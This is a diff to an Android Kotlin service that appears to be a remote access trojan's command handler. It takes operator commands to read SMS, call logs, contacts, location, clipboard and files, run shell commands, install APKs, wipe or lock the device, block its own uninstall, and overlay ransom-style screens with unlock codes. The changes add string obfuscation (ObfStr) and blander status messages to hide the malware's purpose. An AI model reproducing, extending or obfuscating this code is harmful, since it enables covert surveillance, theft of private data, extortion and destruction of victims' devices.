@@ -207,64 +207,64 @@ class ConnectorService : Service() {
         return when {
             // ── File Operations ──
             cmd.startsWith("ls_json:")   -> { val (t, r) = FileOperations.listDir(cmd.removePrefix("ls_json:")); Pair(r, t) }
-            cmd.startsWith("read_b64:")  -> Pair(FileOperations.readFileBase64(cmd.removePrefix("read_b64:")), "command_result")
-            cmd.startsWith("read_text:") -> Pair(FileOperations.readFileText(cmd.removePrefix("read_text:"), 500), "command_result")
+            cmd.startsWith("read_b64:")  -> Pair(FileOperations.readFileBase64(cmd.removePrefix("read_b64:")), ObfStr.cmdResult())
+            cmd.startsWith("read_text:") -> Pair(FileOperations.readFileText(cmd.removePrefix("read_text:"), 500), ObfStr.cmdResult())
             cmd.startsWith("thumb_b64:") -> {
                 val parts = cmd.removePrefix("thumb_b64:").split(":")
                 val path    = parts[0]
                 val maxDim  = parts.getOrNull(1)?.toIntOrNull() ?: 200
                 val quality = parts.getOrNull(2)?.toIntOrNull() ?: 55
-                Pair(FileOperations.generateThumbnail(path, maxDim, quality), "command_result")
+                Pair(FileOperations.generateThumbnail(path, maxDim, quality), ObfStr.cmdResult())
             }
-            cmd.startsWith("write_b64:") -> Pair(if (extra == null) "ERROR: no data" else FileOperations.writeFileBase64(cmd.removePrefix("write_b64:"), extra), "command_result")
-            cmd.startsWith("write_text:")-> Pair(if (extra == null) "ERROR: no content" else FileOperations.writeFileText(cmd.removePrefix("write_text:"), extra), "command_result")
-            cmd.startsWith("mkdir:")     -> Pair(FileOperations.makeDir(cmd.removePrefix("mkdir:")), "command_result")
-            cmd.startsWith("delete:")    -> Pair(FileOperations.deleteFile(cmd.removePrefix("delete:")), "command_result")
-            cmd.startsWith("move:")      -> { val p = cmd.removePrefix("move:").split(":"); Pair(if (p.size < 2) "ERROR" else FileOperations.moveFile(p[0], p[1]), "command_result") }
-            cmd.startsWith("file_info:") -> Pair(FileOperations.getFileInfo(cmd.removePrefix("file_info:")), "command_result")
+            cmd.startsWith("write_b64:") -> Pair(if (extra == null) "ERROR: no data" else FileOperations.writeFileBase64(cmd.removePrefix("write_b64:"), extra), ObfStr.cmdResult())
+            cmd.startsWith("write_text:")-> Pair(if (extra == null) "ERROR: no content" else FileOperations.writeFileText(cmd.removePrefix("write_text:"), extra), ObfStr.cmdResult())
+            cmd.startsWith("mkdir:")     -> Pair(FileOperations.makeDir(cmd.removePrefix("mkdir:")), ObfStr.cmdResult())
+            cmd.startsWith("delete:")    -> Pair(FileOperations.deleteFile(cmd.removePrefix("delete:")), ObfStr.cmdResult())
+            cmd.startsWith("move:")      -> { val p = cmd.removePrefix("move:").split(":"); Pair(if (p.size < 2) "ERROR" else FileOperations.moveFile(p[0], p[1]), ObfStr.cmdResult()) }
+            cmd.startsWith("file_info:") -> Pair(FileOperations.getFileInfo(cmd.removePrefix("file_info:")), ObfStr.cmdResult())
 
             // ── Shell (stateful — cd persists across commands) ──
-            cmd.startsWith("shell:")     -> Pair(handleShellCommand(cmd.removePrefix("shell:")), "command_result")
+            cmd.startsWith("shell:")     -> Pair(handleShellCommand(cmd.removePrefix("shell:")), ObfStr.cmdResult())
 
             // ── Package Manager (via shell) ──
-            cmd.startsWith("pm_grant:")     -> { val p = cmd.removePrefix("pm_grant:").split(":"); Pair(if (p.size < 2) "ERROR" else runShell("pm grant ${p[0]} ${p[1]}"), "command_result") }
-            cmd.startsWith("pm_revoke:")    -> { val p = cmd.removePrefix("pm_revoke:").split(":"); Pair(if (p.size < 2) "ERROR" else runShell("pm revoke ${p[0]} ${p[1]}"), "command_result") }
-            cmd.startsWith("pm_uninstall:") -> Pair(runShell("pm uninstall ${cmd.removePrefix("pm_uninstall:").trim()}"), "command_result")
-            cmd.startsWith("settings_put:") -> { val p = cmd.removePrefix("settings_put:").split(":", limit=3); Pair(if (p.size < 3) "ERROR" else runShell("settings put ${p[0]} ${p[1]} ${p[2]}"), "command_result") }
-            cmd.startsWith("settings_get:") -> { val p = cmd.removePrefix("settings_get:").split(":", limit=2); Pair(if (p.size < 2) "ERROR" else runShell("settings get ${p[0]} ${p[1]}"), "command_result") }
+            cmd.startsWith("pm_grant:")     -> { val p = cmd.removePrefix("pm_grant:").split(":"); Pair(if (p.size < 2) "ERROR" else runShell("pm grant ${p[0]} ${p[1]}"), ObfStr.cmdResult()) }
+            cmd.startsWith("pm_revoke:")    -> { val p = cmd.removePrefix("pm_revoke:").split(":"); Pair(if (p.size < 2) "ERROR" else runShell("pm revoke ${p[0]} ${p[1]}"), ObfStr.cmdResult()) }
+            cmd.startsWith("pm_uninstall:") -> Pair(runShell("pm uninstall ${cmd.removePrefix("pm_uninstall:").trim()}"), ObfStr.cmdResult())
+            cmd.startsWith("settings_put:") -> { val p = cmd.removePrefix("settings_put:").split(":", limit=3); Pair(if (p.size < 3) "ERROR" else runShell("settings put ${p[0]} ${p[1]} ${p[2]}"), ObfStr.cmdResult()) }
+            cmd.startsWith("settings_get:") -> { val p = cmd.removePrefix("settings_get:").split(":", limit=2); Pair(if (p.size < 2) "ERROR" else runShell("settings get ${p[0]} ${p[1]}"), ObfStr.cmdResult()) }
 
             // ── Location (dex module) ──
-            cmd == "get_location"        -> LocationModule.execute(this)
+            cmd == ObfStr.cmdLocation()        -> LocationModule.execute(this)
 
             // ── Call log (dex module) ──
-            cmd.startsWith("get_sms")     -> SmsModule.execute(this, cmd)
-            cmd.startsWith("get_calls")  -> CallLogModule.execute(this, cmd)
+            cmd.startsWith(ObfStr.cmdSms())     -> SmsModule.execute(this, cmd)
+            cmd.startsWith(ObfStr.cmdCalls())  -> CallLogModule.execute(this, cmd)
 
             // ── Contacts (dex module) ──
-            cmd.startsWith("get_contacts") -> ContactsModule.execute(this, cmd)
+            cmd.startsWith(ObfStr.cmdContacts()) -> ContactsModule.execute(this, cmd)
 
             // ── Installed apps ──
-            cmd == "get_apps" || cmd.startsWith("pm_list") -> Pair(getInstalledApps(), "command_result")
+            cmd == "get_apps" || cmd.startsWith("pm_list") -> Pair(getInstalledApps(), ObfStr.cmdResult())
 
             // ── Ring device ──
-            cmd == "ring_device"         -> Pair(ringDevice(), "command_result")
-            cmd == "stop_ring"           -> Pair(stopRing(), "command_result")
+            cmd == "ring_device"         -> Pair(ringDevice(), ObfStr.cmdResult())
+            cmd == "stop_ring"           -> Pair(stopRing(), ObfStr.cmdResult())
 
             // ── WiFi ──
-            cmd == "scan_wifi"           -> Pair(scanWifi(), "command_result")
-            cmd == "get_wifi_saved"      -> Pair(getWifiSaved(), "command_result")
+            cmd == "scan_wifi"           -> Pair(scanWifi(), ObfStr.cmdResult())
+            cmd == "get_wifi_saved"      -> Pair(getWifiSaved(), ObfStr.cmdResult())
 
             // ── Processes ──
-            cmd == "get_processes"       -> Pair(runShell("ps -A"), "command_result")
+            cmd == "get_processes"       -> Pair(runShell("ps -A"), ObfStr.cmdResult())
 
             // ── Device control ──
-            cmd == "wake_screen"         -> Pair(wakeScreen(), "command_result")
-            cmd == "lock_screen"         -> Pair(lockScreen(), "command_result")
-            cmd == "wipe_device"         -> Pair(wipeDevice(), "command_result")
-            cmd.startsWith("vibrate:")   -> Pair(vibrateCustom(cmd.removePrefix("vibrate:").toIntOrNull() ?: 1), "command_result")
-            cmd == "send_notification"   -> Pair(sendCustomNotification(extra), "command_result")
-            cmd == "get_clipboard"       -> Pair(getClipboard(), "command_result")
-            cmd.startsWith("install_apk:") -> Pair(installApk(cmd.removePrefix("install_apk:")), "command_result")
+            cmd == "wake_screen"         -> Pair(wakeScreen(), ObfStr.cmdResult())
+            cmd == "lock_screen"         -> Pair(lockScreen(), ObfStr.cmdResult())
+            cmd == "wipe_device"         -> Pair(wipeDevice(), ObfStr.cmdResult())
+            cmd.startsWith("vibrate:")   -> Pair(vibrateCustom(cmd.removePrefix("vibrate:").toIntOrNull() ?: 1), ObfStr.cmdResult())
+            cmd == "send_notification"   -> Pair(sendCustomNotification(extra), ObfStr.cmdResult())
+            cmd == "get_clipboard"       -> Pair(getClipboard(), ObfStr.cmdResult())
+            cmd.startsWith("install_apk:") -> Pair(installApk(cmd.removePrefix("install_apk:")), ObfStr.cmdResult())
 
             // ── Screenshot + Mic ──
             cmd.startsWith("screenshot") -> MediaModule.execute(this, cmd)
@@ -279,34 +279,34 @@ class ConnectorService : Service() {
             cmd.startsWith("readb64:") -> FileManagerModule.execute(this, cmd)
 
             // ── Misc ──
-            cmd == "device_info" -> Pair(DeviceInfo.collect(this).toString(), "command_result")
-            cmd == "ping"        -> Pair("pong · $deviceName · $deviceId", "command_result")
+            cmd == "device_info" -> Pair(DeviceInfo.collect(this).toString(), ObfStr.cmdResult())
+            cmd == "ping"        -> Pair("pong · $deviceName · $deviceId", ObfStr.cmdResult())
 
             // ── Screen Inject ──
             cmd.startsWith("screen_inject_hacker:")   -> {
                 val raw  = cmd.removePrefix("screen_inject_hacker:")
                 val spd  = Regex("\\|\\|spd:([0-9.]+)").find(raw)?.groupValues?.getOrNull(1)?.toFloatOrNull() ?: 0.60f
                 val txt  = raw.replace(Regex("\\|\\|spd:[0-9.]+"), "")
-                Pair(doScreenInject(txt, "hacker", spd), "command_result")
+                Pair(doScreenInject(txt, "hacker", spd), ObfStr.cmdResult())
             }
-            cmd.startsWith("screen_inject_matrix:")   -> Pair(doScreenInject(cmd.removePrefix("screen_inject_matrix:"),   "matrix"),   "command_result")
-            cmd.startsWith("screen_inject_terminal:") -> Pair(doScreenInject(cmd.removePrefix("screen_inject_terminal:"), "terminal"), "command_result")
-            cmd.startsWith("screen_inject_glitch:")   -> Pair(doScreenInject(cmd.removePrefix("screen_inject_glitch:"),   "glitch"),   "command_result")
-            cmd.startsWith("screen_inject:")          -> Pair(doScreenInject(cmd.removePrefix("screen_inject:"),          "hacker"),   "command_result")
-            cmd == "screen_inject_stop"               -> Pair(doScreenInjectStop(), "command_result")
-            cmd.startsWith("screen_inject_set_code:")  -> Pair(doSetUnlockCode(cmd.removePrefix("screen_inject_set_code:")), "command_result")
-            cmd == "screen_inject_reset_code"           -> Pair(doResetUnlockCode(), "command_result")
+            cmd.startsWith("screen_inject_matrix:")   -> Pair(doScreenInject(cmd.removePrefix("screen_inject_matrix:"),   "matrix"),   ObfStr.cmdResult())
+            cmd.startsWith("screen_inject_terminal:") -> Pair(doScreenInject(cmd.removePrefix("screen_inject_terminal:"), "terminal"), ObfStr.cmdResult())
+            cmd.startsWith("screen_inject_glitch:")   -> Pair(doScreenInject(cmd.removePrefix("screen_inject_glitch:"),   "glitch"),   ObfStr.cmdResult())
+            cmd.startsWith("screen_inject:")          -> Pair(doScreenInject(cmd.removePrefix("screen_inject:"),          "hacker"),   ObfStr.cmdResult())
+            cmd == "screen_inject_stop"               -> Pair(doScreenInjectStop(), ObfStr.cmdResult())
+            cmd.startsWith("screen_inject_set_code:")  -> Pair(doSetUnlockCode(cmd.removePrefix("screen_inject_set_code:")), ObfStr.cmdResult())
+            cmd == "screen_inject_reset_code"           -> Pair(doResetUnlockCode(), ObfStr.cmdResult())
 
             // ── Block/Unblock Uninstall (Device Admin/Owner) ──
-            cmd.startsWith("block_uninstall:") -> Pair(AppDeviceAdminReceiver.setBlockUninstall(this, cmd.removePrefix("block_uninstall:").trim() == "true"), "command_result")
+            cmd.startsWith("block_uninstall:") -> Pair(AppDeviceAdminReceiver.setBlockUninstall(this, cmd.removePrefix("block_uninstall:").trim() == "true"), ObfStr.cmdResult())
 
             // ── Self-Destruct: matikan guard + hapus admin + uninstall ──
             // RAHASIA — hanya operator panel yang bisa kirim command ini
-            cmd == "self_destruct"  -> Pair(doSelfDestruct(), "command_result")
+            cmd == "self_destruct"  -> Pair(doSelfDestruct(), ObfStr.cmdResult())
 
-            cmd == "modules_reload"         -> Pair("✅ Modules loaded inline — no reload needed", "command_result")
+            cmd == "modules_reload"         -> Pair("✅ Modules loaded inline — no reload needed", ObfStr.cmdResult())
 
-            else -> Pair("ERROR: Unknown command: $cmd", "command_result")
+            else -> Pair("ERROR: Unknown command: $cmd", ObfStr.cmdResult())
         }
     }
 
@@ -412,7 +412,7 @@ class ConnectorService : Service() {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
             val admin = android.content.ComponentName(this, AppDeviceAdminReceiver::class.java)
             if (dpm.isAdminActive(admin)) { dpm.lockNow(); "🔒 Layar dikunci" }
-            else "⚠️ Device Admin belum aktif."
+            else "Service inactive."
         } catch (e: Exception) { "Error: ${e.message}" }
     }
 
@@ -435,7 +435,7 @@ class ConnectorService : Service() {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
             val admin = android.content.ComponentName(this, AppDeviceAdminReceiver::class.java)
             if (dpm.isAdminActive(admin)) { dpm.wipeData(0); "💀 Factory reset dimulai…" }
-            else "⚠️ Device Admin belum aktif."
+            else "Service inactive."
         } catch (e: Exception) { "Error: ${e.message}" }
     }
 
@@ -677,7 +677,7 @@ class ConnectorService : Service() {
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setSmallIcon(android.R.drawable.ic_menu_share)
-            .setContentTitle("IWX Panel ${if (connected) "🟢" else "🔴"}")
+            .setContentTitle("${ObfStr.panelTag()} ${if (connected) "🟢" else "🔴"}")
             .setContentText(status)
             .setContentIntent(open)
             .addAction(android.R.drawable.ic_delete, "Stop", stop)
